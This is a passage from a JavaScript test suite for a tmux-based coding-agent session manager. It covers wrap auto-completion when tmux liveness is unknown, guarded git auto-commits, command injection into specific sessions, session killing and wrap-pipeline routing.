      const b = store.sessions.start({
        projectId: project2.id, engineId: 'claude', tmuxSession: 'tc-cadence-d'
      });
      const realProbe = tmux.probeSession;
      const lines = [];
      setConsoleStream({ write: (s) => lines.push(s) });
      setLevel('debug');
      try {
        tmux.probeSession = () => UNREACHABLE;
        sessions.getSessionStatus('cadence-status');
        sessions.getSessionStatus('cadence-status-2');
      } finally {
        tmux.probeSession = realProbe;
        setConsoleStream(null);
        setLevel('info');
        store.sessions.kill(a.id, 'test cleanup');
        store.sessions.kill(b.id, 'test cleanup');
      }
      assert.equal(count(lines, 'WARN'), 2,
        'two panes nobody can reach are two conditions, and each is news once');
    });
  });

  // The same defect one state along: a WRAPPING row. `autoCompleteWrap` writes
  // the wrap complete, tears down the Medusa listener, and commits the
  // operator's repository — so a tmux server too wedged to answer could end a
  // wrap that was still running and commit a working tree, on a fact nobody
  // established. Nothing recovered when tmux came back (#908).
  //
  // Every test here booby-traps `git.commit`. The failure mode of these guards
  // is not a wrong assertion — it is a REAL commit in a repository, so a
  // regression has to fail loudly rather than quietly write history.
  describe('a wrap whose liveness tmux could not report is not completed (#908)', () => {
    let sessions;
    const tmux = require('../lib/tmux');
    const git = require('../lib/git');
    const engines = require('../lib/engines');
    let projectId;
    let projDir;

    before(() => {
      sessions = require('../lib/sessions');
      projDir = path.join(projectsDir, 'wedge-wrap');
      fs.mkdirSync(projDir, { recursive: true });
      projectId = store.projects.create({
        name: 'wedge-wrap', path: projDir, engine: 'claude'
      }).id;
    });

    /**
     * Run `fn` with `tmux.probeSession` answering `verdict`, and with
     * `git.commit` trapped so that reaching it fails the test instead of
     * committing a real repository.
     * @param {object} verdict - `{live, answered, cause}`.
     * @param {Function} fn - Test body.
     * @returns {any}
     */
    function withProbeAndNoCommit(verdict, fn) {
      const realProbe = tmux.probeSession;
      const realCommit = git.commit;
      const realIsRepo = git.isGitRepo;
      const realCreate = tmux.createSession;
      tmux.probeSession = () => verdict;
      // ARMING THE TRAP, and it is load-bearing. `_autoCommitIfDirty` returns
      // early unless the project path is a git repository, and the fixture
      // directory is not one — so without this the commit trap below is
      // UNREACHABLE and every guard in this describe passes whether or not the
      // code auto-completes. A trap that cannot fire measures nothing.
      git.isGitRepo = () => true;
      git.commit = () => {
        throw new Error('a wrap that could not be observed must not commit the operator repository');
      };
      tmux.createSession = () => {
        throw new Error('launchSession must refuse before creating a session');
      };
      try {
        return fn();
      } finally {
        tmux.probeSession = realProbe;
        git.commit = realCommit;
        git.isGitRepo = realIsRepo;
        tmux.createSession = realCreate;
      }
    }

    /**
     * Create a wrapping session row for the fixture project.
     * @param {string} tmuxName - tmux handle to record on the row.
     * @returns {object} The wrapping session row.
     */
    function startWrapping(tmuxName) {
      const s = store.sessions.start({ projectId, engineId: 'claude', tmuxSession: tmuxName });
      store.sessions.setWrapping(s.id);
      return store.sessions.get(s.id);
    }

    /**
     * Clean up whatever state a test left behind.
     * @param {number} id - Session id.
     */
    function cleanup(id) {
      const row = store.sessions.get(id);
      if (row && row.status !== 'wrapped' && row.status !== 'killed') {
        store.sessions.kill(id, 'test cleanup');
      }
    }

    it('launchSession refuses instead of completing a wrap it could not observe', () => {
      const wrapping = startWrapping('tc-wedge-wrap-launch');
      try {
        // THE MUTATION THIS CATCHES: auto-completing on `!live` alone, which is
        // what `!tmux.hasSession(...)` meant here and what shipped.
        const result = withProbeAndNoCommit(
          { live: false, answered: false, cause: 'read-timed-out' },
          () => sessions.launchSession('wedge-wrap')
        );

        assert.equal(result.session, null);
        assert.equal(result.code, 'LIVENESS_UNKNOWN',
          'the route classifies by code, so the refusal must carry one');
        assert.match(result.error, /could not determine/i);
        assert.equal(store.sessions.get(wrapping.id).status, 'wrapping',
          'the wrap must still be open — completing it is what nobody established');
      } finally {
        cleanup(wrapping.id);
      }
    });

    it('getSessionStatus reports still-wrapping rather than finalizing it', () => {
      const wrapping = startWrapping('tc-wedge-wrap-status');
      try {
        const status = withProbeAndNoCommit(
          { live: false, answered: false, cause: 'read-timed-out' },
          () => sessions.getSessionStatus('wedge-wrap')
        );

        assert.equal(status.wrapping, true, 'the row says wrapping; the read must not overrule it');
        assert.notEqual(status.wrapCompleted, true);
        assert.deepEqual(status.incomplete, ['idle', 'lastOutputAge'],
          'the fields it could not establish are the ones it returns, named');
        assert.equal(status.cause, 'read-timed-out');
        // `false` here would be a plausible default in the one change whose
        // subject is not shipping plausible defaults — and the session page
        // reads `idle` as its wrap-completion signal, so a definite "not idle"
        // is a wrong answer to the question it is asking.
        assert.equal(status.idle, null, 'idle is unknown, not false');
        assert.equal(status.lastOutputAge, null);
        assert.equal(store.sessions.get(wrapping.id).status, 'wrapping');
      } finally {
        cleanup(wrapping.id);
      }
    });

    it('still completes the wrap when tmux ANSWERED that the pane is gone', () => {
      // The other half. Without this the fix is a blanket "never auto-complete",
      // which would strand every genuinely finished wrap.
      const wrapping = startWrapping('tc-wedge-wrap-dead');
      const realProbe = tmux.probeSession;
      const realCommit = git.commit;
      const realIsRepo = git.isGitRepo;
      let committed = 0;
      tmux.probeSession = () => ({ live: false, answered: true, cause: null });
      git.isGitRepo = () => true;
      git.commit = () => { committed++; return { committed: true }; };
      try {
        const status = sessions.getSessionStatus('wedge-wrap');
        assert.equal(status.wrapCompleted, true);
        assert.equal(store.sessions.get(wrapping.id).status, 'wrapped');
        // This assertion is what PROVES the traps in the other tests are armed:
        // it shows the commit really is reachable from this path under the same
        // stubs, so a guard that expects NO commit is measuring something.
        assert.equal(committed, 1, 'an observed-dead wrap still runs its auto-commit');
      } finally {
        tmux.probeSession = realProbe;
        git.commit = realCommit;
        git.isGitRepo = realIsRepo;
        cleanup(wrapping.id);
      }
    });

    it('launchSession still completes a young wrap tmux ANSWERED was dead, and proceeds', () => {
      // The launch-path counterpart of the test above, and it exists because a
      // mutation proved it was missing: widening the refusal from
      // `!probe.answered` to `!probe.live` survived the whole suite. That
      // mutation would refuse every launch after a genuinely finished wrap —
      // the project becomes unlaunchable until the row ages out an hour.
      const wrapping = startWrapping('tc-wedge-wrap-dead-launch');
      const realProbe = tmux.probeSession;
      const realCommit = git.commit;
      const realIsRepo = git.isGitRepo;
      const realCreate = tmux.createSession;
      const realDetect = engines.detectEngine;
      tmux.probeSession = () => ({ live: false, answered: true, cause: null });
      git.isGitRepo = () => true;
      git.commit = () => ({ committed: true });
      tmux.createSession = () => true;
      engines.detectEngine = () => ({ available: true, path: '/usr/bin/claude' });
      try {
        const result = sessions.launchSession('wedge-wrap');

        assert.equal(store.sessions.get(wrapping.id).status, 'wrapped',
          'tmux answered that the pane is gone, so the wrap is genuinely over');
        assert.ok(result.session,
          'and the launch proceeds — refusing here would brick the project for an hour');
      } finally {
        tmux.probeSession = realProbe;
        git.commit = realCommit;
        git.isGitRepo = realIsRepo;
        tmux.createSession = realCreate;
        engines.detectEngine = realDetect;
        cleanup(wrapping.id);
        const active = store.sessions.getActive(projectId);
        if (active) store.sessions.kill(active.id, 'test cleanup');
      }
    });

    // The #105 interaction, and the reason this fix is a restructure rather than
    // one extra condition. The age recovery used to be nested INSIDE the
    // liveness branch, so a probe that never answered skipped it too — and a
    // refusal on the unanswered path would then have left the row `wrapping`
    // with no way out, which is the exact brick #105 was filed for. Age is
    // evidence this process owns, so it is now tested first.
    it('still recovers a row older than the threshold when the probe never answers (#105)', () => {
      const wrapping = startWrapping('tc-wedge-wrap-stale');
      const db = store.getDb();
      db.prepare(`UPDATE sessions SET wrap_started_at = datetime('now', '-3 hours') WHERE id = ?`)
        .run(wrapping.id);

      const realProbe = tmux.probeSession;
      const realKill = tmux.killSession;
      const realCreate = tmux.createSession;
      const realDetect = engines.detectEngine;
      tmux.probeSession = () => ({ live: false, answered: false, cause: 'read-timed-out' });
      tmux.killSession = () => {};
      tmux.createSession = () => true;
      engines.detectEngine = () => ({ available: true, path: '/usr/bin/claude' });
      try {
        // MUTATION THIS CATCHES: letting an unanswered probe withhold the age
        // recovery. The row would stay `wrapping` forever on a wedged server —
        // the exact brick #105 exists to prevent.
        //
        // The invariant is the OUTCOME, not whether a probe happened. An earlier
        // version of this guard asserted the probe was never called, which
        // pinned an implementation detail: the probe MAY be consulted here (it
        // has to be, to preserve auto-complete for a confirmed-dead pane), it
        // just may not be allowed to withhold recovery.
        sessions.launchSession('wedge-wrap');

        assert.equal(store.sessions.get(wrapping.id).status, 'killed',
          'an hours-old wrapping row is an orphan whether or not tmux will discuss it');
      } finally {
        tmux.probeSession = realProbe;
        tmux.killSession = realKill;
        tmux.createSession = realCreate;
        engines.detectEngine = realDetect;
        cleanup(wrapping.id);
        const active = store.sessions.getActive(projectId);
        if (active) store.sessions.kill(active.id, 'test cleanup');
      }
    });

    it('an aged-out row whose pane tmux CONFIRMS is gone is completed, not killed', () => {
      // The outcome the first cut of #908 changed by accident. Hoisting the age
      // test above the liveness test silently turned "old + confirmed dead" from
      // autoCompleteWrap into a plain kill — dropping the wrap summary, the
      // Medusa teardown and the auto-commit, for a row where tmux had actually
      // ANSWERED. Nothing about fixing the unanswered case justifies altering
      // what happens when tmux did answer, so this pins the pre-existing outcome.
      const wrapping = startWrapping('tc-wedge-wrap-old-dead');
      store.getDb()
        .prepare(`UPDATE sessions SET wrap_started_at = datetime('now', '-3 hours') WHERE id = ?`)
        .run(wrapping.id);

      const realProbe = tmux.probeSession;
      const realCommit = git.commit;
      const realIsRepo = git.isGitRepo;
      const realCreate = tmux.createSession;
      const realDetect = engines.detectEngine;
      let committed = 0;
      tmux.probeSession = () => ({ live: false, answered: true, cause: null });
      git.isGitRepo = () => true;
      git.commit = () => { committed++; return { committed: true }; };
      tmux.createSession = () => true;
      engines.detectEngine = () => ({ available: true, path: '/usr/bin/claude' });
      try {
        sessions.launchSession('wedge-wrap');

        assert.equal(store.sessions.get(wrapping.id).status, 'wrapped',
          'tmux answered that the pane is gone, so the wrap is over and completing it is honest');
        assert.equal(committed, 1,
          'and the auto-commit that outcome has always carried still runs');
      } finally {
        tmux.probeSession = realProbe;
        git.commit = realCommit;
        git.isGitRepo = realIsRepo;
        tmux.createSession = realCreate;
        engines.detectEngine = realDetect;
        cleanup(wrapping.id);
        const active = store.sessions.getActive(projectId);
        if (active) store.sessions.kill(active.id, 'test cleanup');
      }
    });

    it('still refuses a launch while a young wrap is genuinely live', () => {
      const wrapping = startWrapping('tc-wedge-wrap-live');
      try {
        const result = withProbeAndNoCommit(
          { live: true, answered: true, cause: null },
          () => sessions.launchSession('wedge-wrap')
        );
        assert.equal(result.session, null);
        assert.match(result.error, /currently wrapping/);
        assert.equal(store.sessions.get(wrapping.id).status, 'wrapping');
      } finally {
        cleanup(wrapping.id);
      }
    });
  });

  describe('getSessionStatus (no active session)', () => {
    let sessions;
    const tmux = require('../lib/tmux');

    before(() => {
      sessions = require('../lib/sessions');
    });

    it('returns null for unknown project', () => {
      const status = sessions.getSessionStatus('nonexistent-project');
      assert.equal(status, null);
    });

    it('returns inactive status with last session', () => {
      const status = sessions.getSessionStatus('prime-test');
      assert.ok(status);
      assert.equal(status.active, false);
      assert.equal(status.project, 'prime-test');
      assert.ok(status.lastSession);
      assert.equal(status.lastSession.status, 'wrapped');
    });

    it('returns active+untracked when tmux session exists but DB has no active record', () => {
      // Stubs `probeSession`, which is the seam this branch reads now — it moved
      // off `hasSession` because that boolean answers false both for a pane that
      // is gone and for a tmux too wedged to reply, and the code below this
      // branch states an absence. Stubbing the old name would leave the REAL
      // probe running: the assertions would then be measuring this machine's
      // tmux rather than the branch, and would pass or fail by accident.
      const originalProbe = tmux.probeSession;
      tmux.probeSession = (name) => ({
        live: name === 'prime-test', answered: true, cause: null
      });
      try {
        // prime-test has a wrapped (not active) DB session, but tmux says it exists
        const status = sessions.getSessionStatus('prime-test');
        assert.ok(status);
        assert.equal(status.active, true);
        assert.equal(status.untracked, true);
        assert.equal(status.tmuxSession, 'prime-test');
        assert.equal(status.engine, null);
      } finally {
        tmux.probeSession = originalProbe;
      }
    });
  });

  describe('injectCommand', () => {
    let sessions;

    before(() => {
      sessions = require('../lib/sessions');
    });

    it('returns error for unknown project', () => {
      const result = sessions.injectCommand('nonexistent', 'ls');
      assert.equal(result.ok, false);
      assert.ok(result.error.includes('not found'));
    });

    it('returns error when no active session', () => {
      const result = sessions.injectCommand('prime-test', 'ls');
      assert.equal(result.ok, false);
      assert.ok(result.error.includes('No active session'));
    });

    it('rejects commands exceeding 4096 characters', () => {
      const longCommand = 'x'.repeat(4097);
      const result = sessions.injectCommand('prime-test', longCommand);
      assert.equal(result.ok, false);
      assert.ok(result.error.includes('maximum length'));
    });
  });

  // ── injectCommand explicit session addressing (MED-7Q4C) ──
  //
  // `getActive` is a project-scoped "most recently started active session"
  // lookup, and nothing in the schema forbids a project holding two. A caller
  // that resolves a session itself (medusa-wake judges a pane idle) must be able
  // to address THAT session, or judgment and delivery silently diverge.

  describe('injectCommand with options.sessionId', () => {
    let sessions;
    let tmux;
    let projectId;
    let sent;
    let started = [];
    let originalHasSession;
    let originalSendKeys;

    before(() => {
      sessions = require('../lib/sessions');
      tmux = require('../lib/tmux');

      const projDir = path.join(projectsDir, 'inject-multi');
      fs.mkdirSync(projDir, { recursive: true });
      projectId = store.projects.create({
        name: 'inject-multi',
        path: projDir,
        engine: 'claude'
      }).id;
    });

    beforeEach(() => {
      sent = [];
      originalHasSession = tmux.hasSession;
      originalSendKeys = tmux.sendKeys;
      tmux.hasSession = () => true;
      tmux.sendKeys = (session, command) => { sent.push({ session, command }); };
    });

    // Kill every session these tests started, pass or fail — an assertion that
    // throws before an inline cleanup would otherwise leak an active session
    // into the suites that follow.
    afterEach(() => {
      tmux.hasSession = originalHasSession;
      tmux.sendKeys = originalSendKeys;
      for (const s of started) {
        if (store.sessions.get(s.id).status === 'active') store.sessions.kill(s.id, 'test cleanup');
      }
      started = [];
    });

    /** Start a session and register it for unconditional afterEach cleanup. */
    function startSession(tmuxSession, owningProjectId = projectId) {
      const s = store.sessions.start({ projectId: owningProjectId, engineId: 'claude', tmuxSession });
      started.push(s);
      return s;
    }

    it('sends to the addressed session, not to getActive\'s pick', () => {
      const a = startSession('tc-multi-a');
      const b = startSession('tc-multi-b');

      // Derive the target from getActive's ACTUAL pick rather than assuming the
      // tie-break, then address the other one — so the assertion proves the
      // sessionId is honored no matter which way the ordering falls.
      const picked = store.sessions.getActive(projectId);
      const other = [a, b].find((s) => s.id !== picked.id);

      const result = sessions.injectCommand('inject-multi', 'wake up', { sessionId: other.id });
      assert.equal(result.ok, true);
      assert.equal(sent.length, 1);
      assert.equal(sent[0].session, other.tmuxSession);
      assert.notEqual(sent[0].session, picked.tmuxSession, 'sessionId must override the getActive lookup');
    });

    it('still resolves getActive when no sessionId is given', () => {
      startSession('tc-multi-solo');
      const result = sessions.injectCommand('inject-multi', 'wake up');
      assert.equal(result.ok, true);
      assert.equal(sent[0].session, 'tc-multi-solo');
    });

    it('refuses a session belonging to another project', () => {
      const foreign = startSession('tc-foreign', store.projects.getByName('prime-test').id);
      startSession('tc-multi-own');
      const result = sessions.injectCommand('inject-multi', 'wake up', { sessionId: foreign.id });
      assert.equal(result.ok, false);
      assert.ok(result.error.includes('not a session of'));
      assert.equal(sent.length, 0, 'a foreign id must not fall back to this project\'s own pane');
    });

    it('refuses a session that is no longer active', () => {
      const dead = startSession('tc-multi-dead');
      store.sessions.kill(dead.id, 'test');
      const result = sessions.injectCommand('inject-multi', 'wake up', { sessionId: dead.id });
      assert.equal(result.ok, false);
      assert.ok(result.error.includes('not active'));
      assert.equal(sent.length, 0, 'a dead session\'s stale tmux name must never be addressed');
    });

    it('refuses an unknown session id', () => {
      const result = sessions.injectCommand('inject-multi', 'wake up', { sessionId: 999999 });
      assert.equal(result.ok, false);
      assert.ok(result.error.includes('not a session of'));
      assert.equal(sent.length, 0);
    });
  });

  describe('peek', () => {
    let sessions;

    before(() => {
      sessions = require('../lib/sessions');
    });

    it('returns error for unknown project', () => {
      const result = sessions.peek('nonexistent');
      assert.equal(result.lines, null);
      assert.ok(result.error.includes('not found'));
    });

    it('returns error when no active session', () => {
      const result = sessions.peek('prime-test');
      assert.equal(result.lines, null);
      assert.ok(result.error.includes('No active session'));
    });

    it('accepts options object with lines param', () => {
      const result = sessions.peek('nonexistent', { lines: 50 });
      assert.equal(result.lines, null);
      assert.ok(result.error.includes('not found'));
    });

    it('accepts options object with full param', () => {
      const result = sessions.peek('nonexistent', { full: true });
      assert.equal(result.lines, null);
      assert.ok(result.error.includes('not found'));
    });
  });

  describe('triggerWrap', () => {
    let sessions;

    before(() => {
      sessions = require('../lib/sessions');
    });

    it('returns error for unknown project', async () => {
      const result = await sessions.triggerWrap('nonexistent');
      assert.equal(result.ok, false);
      assert.ok(result.error.includes('not found'));
    });

    it('returns error when no active session', async () => {
      const result = await sessions.triggerWrap('prime-test');
      assert.equal(result.ok, false);
      assert.ok(result.error.includes('No active session'));
    });
  });

  describe('killSession', () => {
    let sessions;

    before(() => {
      sessions = require('../lib/sessions');
    });

    it('returns error for unknown project', () => {
      const result = sessions.killSession('nonexistent');
      assert.equal(result.session, null);
      assert.ok(result.error.includes('not found'));
    });

    it('returns error when no active session', () => {
      const result = sessions.killSession('prime-test');
      assert.equal(result.session, null);
      assert.ok(result.error.includes('No active session'));
    });

    it('releases document locks on kill', () => {
      const project = store.projects.getByName('prime-test');

      // Create a group, doc, and lock
      const group = store.projectGroups.create({ name: 'KillLockGroup' });
      store.projectGroups.addMember(group.id, project.id);
      const doc = store.sharedDocs.create({
        groupId: group.id,
        name: 'KillLockDoc',
        filePath: '/tmp/kill-lock.md',
        injectIntoConfig: true
      });

      // Start a session
      const session = store.sessions.start({
        projectId: project.id,
        engineId: 'claude',
        tmuxSession: 'kill-lock-test'
      });

      // Acquire lock
      store.documentLocks.acquire(doc.id, session.id, 'prime-test');
      assert.ok(store.documentLocks.check(doc.id), 'Lock should be acquired');

      // Kill the session
      sessions.killSession('prime-test');

      // Lock should be released
      assert.equal(store.documentLocks.check(doc.id), null, 'Lock should be released after kill');

      // Clean up
      store.sharedDocs.delete(doc.id);
      store.projectGroups.delete(group.id);
    });
  });

  describe('killSession recovers wrapping + orphan tmux (#105)', () => {
    let sessions;
    const tmux = require('../lib/tmux');
    let originalHasSession;
    let originalKillSession;
    let killedTmux;

    before(() => {
      sessions = require('../lib/sessions');
    });

    beforeEach(() => {
      originalHasSession = tmux.hasSession;
      originalKillSession = tmux.killSession;
      killedTmux = [];
      tmux.killSession = (name) => { killedTmux.push(name); };
    });

    afterEach(() => {
      tmux.hasSession = originalHasSession;
      tmux.killSession = originalKillSession;
      // Cleanup any leftover wrapping/active rows so tests are independent
      const project = store.projects.getByName('prime-test');
      if (project) {
        const wrapping = store.sessions.getWrapping(project.id);
        if (wrapping) store.sessions.kill(wrapping.id, 'test cleanup');
        const active = store.sessions.getActive(project.id);
        if (active) store.sessions.kill(active.id, 'test cleanup');
      }
    });

    it('kills wrapping session when tmux is alive', () => {
      const project = store.projects.getByName('prime-test');
      const session = store.sessions.start({
        projectId: project.id,
        engineId: 'claude',
        tmuxSession: 'kill-wrapping-alive'
      });
      store.sessions.setWrapping(session.id);
      tmux.hasSession = (name) => name === 'kill-wrapping-alive';

      const result = sessions.killSession('prime-test', 'user kill while wrapping');

      assert.equal(result.error, null);
      assert.ok(result.session, 'should return killed session');
      assert.equal(result.session.status, 'killed');
      assert.deepEqual(killedTmux, ['kill-wrapping-alive'], 'tmux session should be killed');
    });

    it('kills wrapping session when tmux is already dead — reconciles DB only', () => {
      const project = store.projects.getByName('prime-test');
      const session = store.sessions.start({
        projectId: project.id,
        engineId: 'claude',
        tmuxSession: 'kill-wrapping-dead'
      });
      store.sessions.setWrapping(session.id);
      tmux.hasSession = () => false;

      const result = sessions.killSession('prime-test');

      assert.equal(result.error, null);
      assert.ok(result.session);
      assert.equal(result.session.status, 'killed');
      assert.deepEqual(killedTmux, [], 'should not call tmux.killSession when session is dead');
    });

    it('reconciles orphan tmux when no DB row exists', () => {
      // No active and no wrapping row — but tmux still has a session.
      tmux.hasSession = (name) => name === 'prime-test';

      const result = sessions.killSession('prime-test', 'cleanup orphan');

      assert.equal(result.error, null);
      assert.equal(result.session, null);
      assert.equal(result.reconciled, true);
      assert.deepEqual(killedTmux, ['prime-test'], 'orphan tmux should be killed under the project name');
    });

    it('returns NOT_FOUND-style error when no DB row and no orphan tmux', () => {
      tmux.hasSession = () => false;

      const result = sessions.killSession('prime-test');

      assert.equal(result.session, null);
      assert.ok(result.error.includes('No active session'));
      assert.ok(!result.reconciled);
      assert.deepEqual(killedTmux, []);
    });

    it('clears wrap pane cache when killing wrapping session', () => {
      const project = store.projects.getByName('prime-test');
      const session = store.sessions.start({
        projectId: project.id,
        engineId: 'claude',
        tmuxSession: 'kill-wrapping-cache'
      });
      store.sessions.setWrapping(session.id);
      sessions._wrapPaneCache.set(session.id, 'cached pane output');
      tmux.hasSession = () => true;

      sessions.killSession('prime-test');

      assert.equal(sessions._wrapPaneCache.has(session.id), false, 'cache entry should be cleared');
    });

    it('prefers active over wrapping when both somehow exist', () => {
      // Defensive: there shouldn't normally be both, but if a future bug allows
      // it the kill button must target the active row first.
      const project = store.projects.getByName('prime-test');
      const wrappingSession = store.sessions.start({
        projectId: project.id,
        engineId: 'claude',
        tmuxSession: 'kill-priority-wrap'
      });
      store.sessions.setWrapping(wrappingSession.id);
      const activeSession = store.sessions.start({
        projectId: project.id,
        engineId: 'claude',
        tmuxSession: 'kill-priority-active'
      });
      tmux.hasSession = () => true;

      const result = sessions.killSession('prime-test');

      assert.equal(result.session.id, activeSession.id, 'should target the active row');
      assert.deepEqual(killedTmux, ['kill-priority-active']);

      // Cleanup the still-wrapping row
      store.sessions.kill(wrappingSession.id, 'test cleanup');
    });
  });

  describe('completeWrap', () => {
    let sessions;

    before(() => {
      sessions = require('../lib/sessions');
    });

    it('returns error for unknown project', () => {
      const result = sessions.completeWrap('nonexistent', 'summary');
      assert.equal(result.session, null);
      assert.ok(result.error.includes('not found'));
    });

    it('releases document locks on wrap', () => {
      const project = store.projects.getByName('prime-test');

      // Create a group, doc, and lock
      const group = store.projectGroups.create({ name: 'WrapLockGroup' });
      store.projectGroups.addMember(group.id, project.id);
      const doc = store.sharedDocs.create({
        groupId: group.id,
        name: 'WrapLockDoc',
        filePath: '/tmp/wrap-lock.md',
        injectIntoConfig: true
      });

      // Start a session
      const session = store.sessions.start({
        projectId: project.id,
        engineId: 'claude',
        tmuxSession: 'wrap-lock-test'
      });

      // Acquire lock
      store.documentLocks.acquire(doc.id, session.id, 'prime-test');
      assert.ok(store.documentLocks.check(doc.id), 'Lock should be acquired');

      // Mark as wrapping and complete
      store.sessions.setWrapping(session.id);
      sessions.completeWrap('prime-test', 'test wrap');

      // Lock should be released
      assert.equal(store.documentLocks.check(doc.id), null, 'Lock should be released after wrap');

      // Clean up
      store.sharedDocs.delete(doc.id);
      store.projectGroups.delete(group.id);
    });
  });

  describe('parseWrapSummary', () => {
    let sessions;

    before(() => {
      sessions = require('../lib/sessions');
    });

    it('extracts structured fields from markdown headings', () => {
      const rawOutput = [
        'Some preamble',
        '## summary',
        'We completed chunk 5',
        'All tests pass',
        '## nextSteps',
        'Start chunk 6',
        '## learnings',
        'Wrap parsing is tricky'
      ].join('\n');

      const result = sessions.parseWrapSummary(rawOutput, ['summary', 'nextSteps', 'learnings']);
      assert.ok(result.includes('## summary'));
      assert.ok(result.includes('We completed chunk 5'));
      assert.ok(result.includes('## nextSteps'));
      assert.ok(result.includes('Start chunk 6'));
      assert.ok(result.includes('## learnings'));
    });

    it('falls back to last 50 lines when no fields match', () => {
      const lines = Array.from({ length: 60 }, (_, i) => `line ${i}`);
      const rawOutput = lines.join('\n');

      const result = sessions.parseWrapSummary(rawOutput, ['nonexistent']);
      assert.ok(result.includes('line 59'));
      assert.ok(result.includes('line 10'));
      assert.ok(!result.includes('line 9'));
    });

    it('returns empty string for empty input', () => {
      const result = sessions.parseWrapSummary('', ['summary']);
      assert.equal(result, '');
    });

    it('falls back to raw output when no captureFields provided', () => {
      const result = sessions.parseWrapSummary('some output', []);
      assert.equal(result, 'some output');
    });
  });

  describe('autoCompleteWrap', () => {
    let sessions;

    before(() => {
      sessions = require('../lib/sessions');
    });

    it('wraps session with cached pane output', () => {
      const project = store.projects.getByName('prime-test');
      const session = store.sessions.start({
        projectId: project.id,
        engineId: 'claude',
        tmuxSession: 'auto-wrap-test'
      });
      store.sessions.setWrapping(session.id);

      // Simulate cached pane output
      sessions._wrapPaneCache.set(session.id, '## summary\nDone with chunk\n## nextSteps\nNext chunk');

      const result = sessions.autoCompleteWrap(project, session);
      assert.ok(result);
      assert.equal(result.status, 'wrapped');
      assert.ok(result.wrapSummary.includes('Done with chunk'));
    });

    it('handles missing cache gracefully', () => {
      const project = store.projects.getByName('prime-test');
      const session = store.sessions.start({
        projectId: project.id,
        engineId: 'claude',
        tmuxSession: 'auto-wrap-empty-test'
      });
      store.sessions.setWrapping(session.id);

      const result = sessions.autoCompleteWrap(project, session);
      assert.ok(result);
      assert.equal(result.status, 'wrapped');
      // Empty cache → empty string → store converts to null
      assert.equal(result.wrapSummary, null);
    });
  });

  describe('triggerWrap (methodology-driven)', () => {
    let sessions;
    const tmux = require('../lib/tmux');
    let originalSendKeys;
    let originalHasSession;
    let sentCommand;

    // Shared empty-pipeline-result stub used by V2-routing tests that
    // don't care about the pipeline body (only the routing contract).
    // Frozen so a test can't accidentally mutate the shared instance.
    const EMPTY_V2_RESULT = Object.freeze({
      ok: true, blockedAt: null, results: [], commitSha: null, summary: null, error: null
    });

    before(() => {
      sessions = require('../lib/sessions');
    });

    beforeEach(() => {
      originalSendKeys = tmux.sendKeys;
      originalHasSession = tmux.hasSession;
      sentCommand = null;
      tmux.sendKeys = (name, cmd, opts) => { sentCommand = cmd; };
      tmux.hasSession = () => true;
    });

    afterEach(() => {
      tmux.sendKeys = originalSendKeys;
      tmux.hasSession = originalHasSession;
      // Cleanup active/wrapping sessions and restore methodology
      const project = store.projects.getByName('prime-test');
      if (project) {
        store.projects.update(project.id, { methodology: 'minimal' });
        const active = store.sessions.getActive(project.id);
        if (active) store.sessions.kill(active.id, 'test cleanup');
        const wrapping = store.sessions.getWrapping(project.id);
        if (wrapping) store.sessions.wrap(wrapping.id, 'test cleanup');
      }
    });

    // Retirement pins — the legacy V1 NL-prompt-via-tmux wrap and its
    // `projConfig.wrapV2` opt-out gate are deleted (backlog WRP-2Q6H).
    // The consolidated legacy-behavior tests (byte-equal NL prompt pin,
    // wrapping-status transition, #101 no-version-protocol-in-prompt
    // pins) asserted a code path that no longer exists; these pins
    // replace them with the retired contract: every trigger routes to
    // the pipeline runner, whatever the on-disk flag says.
    it('explicit wrapV2:false on disk still routes to the pipeline runner (legacy opt-out retired)', async () => {
      const project = store.projects.getByName('prime-test');
      const session = store.sessions.start({
        projectId: project.id,
        engineId: 'claude',
        tmuxSession: 'trigger-wrap-optout-retired-test'
      });
      store.projectConfig.save(project.path, {
        ...store.projectConfig.load(project.path),
        wrapV2: false
      });

      const wrapPipelineMod = require('../lib/wrap-pipeline');
      const realRun = wrapPipelineMod.runWrapPipeline;
      let pipelineCalls = 0;
      wrapPipelineMod.runWrapPipeline = async () => { pipelineCalls += 1; return EMPTY_V2_RESULT; };

      try {
        const result = await sessions.triggerWrap('prime-test');
        assert.equal(pipelineCalls, 1, 'stale wrapV2:false must not divert the wrap — the pipeline is the only path');
        assert.equal(result.ok, true);
        assert.equal(result.sessionId, session.id);
        assert.equal(sentCommand, null, 'no NL prompt may be sent to tmux — the legacy sender is gone');
        assert.ok(result.pipelineResult, 'result carries the structured pipeline output');
        assert.ok(Array.isArray(result.wrapSteps), 'legacy response fields survive for the frontend poller');
        assert.ok(Array.isArray(result.captureFields));
        assert.equal(result.wrapCommand, null, 'no legacy wrapCommand exists');
      } finally {
        wrapPipelineMod.runWrapPipeline = realRun;
        const cfg = store.projectConfig.load(project.path);
        delete cfg.wrapV2;
        store.projectConfig.save(project.path, cfg);
      }
    });

    // #101 — TC owns the project-version writer. The pipeline path
    // records the pre-wrap version directly (never by instructing the
    // AI), same contract the legacy path carried.
    it('writes project-version.txt directly during a pipeline wrap (#101)', async () => {
      const project = store.projects.getByName('prime-test');
      store.sessions.start({
        projectId: project.id,
        engineId: 'claude',
        tmuxSession: 'trigger-wrap-tc-writer-test'
      });

      const cachePath = path.join(project.path, '.tangleclaw', 'project-version.txt');
      // Remove any prior recording so we can detect this wrap's write.
      try { fs.rmSync(cachePath, { force: true }); } catch {}

      const wrapPipelineMod = require('../lib/wrap-pipeline');
      const realRun = wrapPipelineMod.runWrapPipeline;
      wrapPipelineMod.runWrapPipeline = async () => EMPTY_V2_RESULT;

      try {
        await sessions.triggerWrap('prime-test');
        assert.ok(fs.existsSync(cachePath), 'wrap should produce the version cache file');
        const body = fs.readFileSync(cachePath, 'utf8');
        assert.match(body, /^version:\s*\S+/m, 'cache file should contain a version: line');
        assert.match(body, /^source:\s*\S+/m, 'cache file should contain a source: line');
        assert.match(body, /^recorded_at:\s*\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}Z$/m, 'recorded_at should be ISO-8601 UTC');
      } finally {
        wrapPipelineMod.runWrapPipeline = realRun;
      }
    });

    it('routes through the wrap pipeline runner and does NOT send tmux command (#139 Chunk 3)', async () => {
      const project = store.projects.getByName('prime-test');
      store.projects.update(project.id, { methodology: 'prawduct' });
      store.sessions.start({
        projectId: project.id,
        engineId: 'claude',
        tmuxSession: 'trigger-wrap-v2-test'
      });

      // Chunk 9 made the `commit` step a real handler — it would
      // shell out to `git status` on the test project's path, which
      // isn't a git repo. Stub it back to a no-op for this routing-
      // contract test; real commit-step behavior is covered in
